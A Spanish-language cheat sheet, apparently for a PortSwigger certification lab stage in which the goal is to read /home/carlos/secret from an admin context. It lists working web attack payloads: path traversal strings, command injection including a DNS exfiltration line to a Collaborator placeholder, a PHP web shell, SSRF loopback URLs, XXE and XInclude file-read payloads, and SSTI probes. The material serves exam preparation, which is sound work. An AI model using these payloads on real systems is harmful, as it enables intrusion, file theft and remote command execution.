# Cheat Sheet — Fase 3: leer `/home/carlos/secret`

Objetivo oficial:

```text
Desde el contexto administrativo,
leer /home/carlos/secret
y enviar su contenido con Submit solution.
```

## Prioridad rápida

```text
1. Path Traversal / LFI
2. OS Command Injection
3. File Upload
4. SSRF
5. XXE / XInclude
6. SSTI
7. Insecure Deserialization
8. Server-side Prototype Pollution
9. SQLi con capacidades file/OOB cuando encaje
```

La funcionalidad administrativa observada decide el orden real.

---

## Recon después de obtener `/admin`

Volver a mapear desde cero:

- [ ] todos los botones admin;
- [ ] reports / PDF;
- [ ] image processing;
- [ ] import/export;
- [ ] XML;
- [ ] upload;
- [ ] templates/email;
- [ ] stock/API/url fetch;
- [ ] filename/path;
- [ ] diagnostics;
- [ ] backups/downloads.

Muchas vías de Fase 3 solo aparecen después de ser admin.

---

## Path Traversal

POC:

```text
../../../etc/passwd
```

Variantes:

```text
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
```

Tras confirmar:

```text
/home/carlos/secret
```

No seguir explotando `/etc/passwd` si ya tienes traversal confirmado.

---

## OS Command Injection

POC reflejada:

```text
; whoami
| whoami
|| whoami
```

Blind:

```text
; sleep 5
```

OAST:

```text
; nslookup $(whoami).COLLABORATOR
```

Objetivo:

```text
cat /home/carlos/secret
```

Si no hay output, usar el canal que enseñe el contexto/lab: OAST o archivo servido por la aplicación.

---

## File Upload

Preguntas rápidas:

```text
¿puedo subir algo ejecutable?
¿puedo cambiar extensión?
¿puedo cambiar Content-Type?
¿validan magic bytes?
¿puedo controlar filename/path?
¿se puede usar .htaccess?
¿hay validación tardía/race?
```

PHP mínimo de lectura en laboratorio:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Web shell mínima:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

No asumir PHP/Apache: identificar stack y comportamiento.

---

## SSRF

POC OAST:

```text
https://COLLABORATOR/
```

Loopback:

```text
http://127.0.0.1/
http://127.0.0.1/admin
http://localhost/admin
```

Si hay filtro:

- normalización de URL;
- encoding;
- variantes loopback;
- open redirect;
- allowlist/blacklist behavior.

No escanear una red completa antes de confirmar SSRF.

---

## XXE / XInclude

XXE local file:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<foo>&xxe;</foo>
```

XInclude:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///home/carlos/secret"/>
</foo>
```

Blind XXE → Collaborator / external DTD según técnica estudiada.

---

## SSTI

Primero detection:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

Después:

```text
identificar engine
→ identificar objetos/gadgets disponibles
→ lectura de archivo o command execution
```

No memorizar un RCE único para todos los motores.

---

## Insecure Deserialization

Señales:

- cookie/token largo serialized;
- Java/PHP/Ruby/.NET serialization markers;
- objetos codificados Base64;
- firmas/MAC;
- datos de sesión serializados.

Workflow:

```text
identificar formato
→ modificar propiedad sencilla
→ entender integrity protection
→ gadget chain solo si procede
```

PortSwigger menciona `ysoserial` como herramienta útil en determinadas técnicas Practitioner.

---

## Server-side Prototype Pollution

Buscar input JSON mergeable y efectos server-side.

Workflow:

```text
pollution POC
→ identificar gadget
→ buscar impacto server-side
→ file/RCE si el contexto lo permite
```

---

## SQLi en Fase 3

Normalmente secundaria frente a técnicas directas de filesystem/RCE, pero puede ser útil si el DBMS permite:

- lectura de archivos;
- OOB;
- OS interaction;
- datos que permitan una cadena posterior.

No invertir tiempo aquí si existe un `filename`, upload, XML o command-like sink más evidente.

---

## Criterio de salida

Cuando obtengas el valor exacto de:

```text
/home/carlos/secret
```

usar **Submit solution**.

No realizar acciones destructivas innecesarias ni borrar componentes/cuentas que puedan dejar la aplicación inutilizable.
